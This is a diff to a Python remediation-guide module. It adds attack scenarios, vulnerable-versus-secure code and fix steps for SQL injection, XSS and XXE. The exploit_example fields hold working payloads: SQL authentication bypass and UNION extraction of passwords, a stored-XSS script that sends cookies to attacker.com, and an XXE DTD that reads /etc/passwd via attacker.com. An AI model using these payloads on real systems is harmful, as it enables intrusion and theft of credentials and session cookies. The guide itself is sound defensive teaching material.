@@ -21,14 +21,49 @@ class RemediationGuide:
                 'Enable SQL error logging but hide errors from users',
                 'Conduct code review of all database queries'
             ],
+            'exploit_example': '''
+ATTACK SCENARIO - SQL Injection:
+1. Test the parameter with: ' OR 1=1--
+2. Error-based: ' AND 1=CONVERT(int, (SELECT @@version))--
+3. Time-based blind: ' OR IF(1=1, SLEEP(5), 0)--
+4. Union-based: ' UNION SELECT null, username, password FROM users--
+
+ATTACK PAYLOAD:
+# Authentication Bypass:
+username: admin' OR '1'='1
+password: anything
+
+# Data Extraction:
+id=1' UNION SELECT null, username, password, email FROM users--
+
+# Boolean Blind:
+id=1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
+''',
             'code_example': '''
 # Bad (Vulnerable):
 query = f"SELECT * FROM users WHERE id = {user_id}"
+cursor.execute(query)
 
-# Good (Secure):
+# Bad (String concatenation):
+query = "SELECT * FROM users WHERE username = '" + username + "'"
+
+# Good (Secure - Parameterized):
 cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
-# Or with ORM:
+
+# Good (ORM):
 User.objects.get(id=user_id)
+
+# Good (Prepared statements - Python):
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
+''',
+            'solution': '''
+SOLUTION:
+1. Use parameterized queries ALWAYS: cursor.execute("SELECT * FROM users WHERE id = ?", (id,))
+2. Use ORM frameworks (SQLAlchemy, Django ORM) that handle parameterization
+3. Validate input: allow only expected characters (whitelist)
+4. Apply least privilege: database user should only have needed permissions
+5. Hide database errors from users: log them but show generic error messages
+6. Use Web Application Firewall (WAF) as additional layer
 ''',
             'references': [
                 'OWASP SQL Injection Prevention Cheat Sheet',
@@ -48,15 +83,43 @@ User.objects.get(id=user_id)
                 'Implement context-aware output encoding (HTML, JavaScript, URL)',
                 'Use modern frameworks with built-in XSS protection'
             ],
+            'exploit_example': '''
+ATTACK SCENARIO - Reflected XSS:
+1. On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string
+2. Right-click and inspect the element, observe that your string has been placed inside an a href attribute
+3. Change returnPath to: javascript:alert(document.cookie)
+4. Hit enter and click "back"
+5. The payload executes and shows the cookies
+
+ATTACK PAYLOAD:
+?returnPath=javascript:alert(document.cookie)
+
+Or for Stored XSS:
+<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+''',
             'code_example': '''
 # Bad (Vulnerable):
 <div>{{ user_input }}</div>
+<a href="{{ returnPath }}">Back</a>
 
 # Good (Secure):
 <div>{{ user_input | escape }}</div>
+<a href="{{ returnPath | escape | validate_url }}">Back</a>
 
 # CSP Header:
 Content-Security-Policy: default-src 'self'; script-src 'self'
+
+# Python/Flask Example:
+from markupsafe import escape
+return f'<div>{escape(user_input)}</div>'
+''',
+            'solution': '''
+SOLUTION:
+1. Encode all user input before displaying it in HTML
+2. Add Content-Security-Policy header: Content-Security-Policy: default-src 'self'
+3. Validate URLs against whitelist before using in href attributes
+4. Set HTTPOnly and Secure flags on all cookies
+5. Use framework's auto-escaping features (Jinja2, React, Angular)
 ''',
             'references': [
                 'OWASP XSS Prevention Cheat Sheet',
@@ -279,6 +342,78 @@ data = json.loads(user_input)
                 'OWASP Deserialization Cheat Sheet',
                 'CWE-502: Deserialization of Untrusted Data',
                 'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html'
+            ]
+        },
+        
+        'XXE (XML External Entity)': {
+            'priority': 'CRITICAL',
+            'fix_time': '1-2 days',
+            'steps': [
+                'Disable XML external entity processing in all XML parsers',
+                'Use less complex data formats like JSON when possible',
+                'Patch or upgrade all XML processors and libraries',
+                'Implement whitelist server-side input validation',
+                'Use SAST tools to detect XXE in source code',
+                'Implement proper error handling to avoid information disclosure'
+            ],
+            'exploit_example': '''
+ATTACK SCENARIO - XXE File Disclosure:
+1. Click "Go to exploit server" and save the following malicious DTD file on your server:
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+2. When imported, this page will read the contents of /etc/passwd into the file entity
+3. Visit a product page, click "Check stock", and intercept the POST request in Burp Suite
+4. Insert the following external entity definition between the XML declaration and stockCheck element:
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+
+5. You should see an error message containing the contents of the /etc/passwd file
+
+ATTACK PAYLOAD:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<stockCheck>
+  <productId>1</productId>
+</stockCheck>
+''',
+            'code_example': '''
+# Bad (Vulnerable):
+import xml.etree.ElementTree as ET
+tree = ET.parse(user_xml_file)
+
+# Good (Secure - Python):
+import xml.etree.ElementTree as ET
+import defusedxml.ElementTree as DET
+tree = DET.parse(user_xml_file)
+
+# Or disable entities manually:
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+tree = etree.parse(user_xml_file, parser)
+
+# Java Example:
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+''',
+            'solution': '''
+SOLUTION:
+1. Disable DOCTYPE declarations: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
+2. Disable external entities: setFeature("http://xml.org/sax/features/external-general-entities", false)
+3. Disable parameter entities: setFeature("http://xml.org/sax/features/external-parameter-entities", false)
+4. Use defusedxml library in Python instead of standard XML parsers
+5. Prefer JSON over XML for data interchange when possible
+6. Implement strict input validation and sanitization
+''',
+            'references': [
+                'OWASP XXE Prevention Cheat Sheet',
+                'CWE-611: Improper Restriction of XML External Entity Reference',
+                'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'
             ]
         }
     }
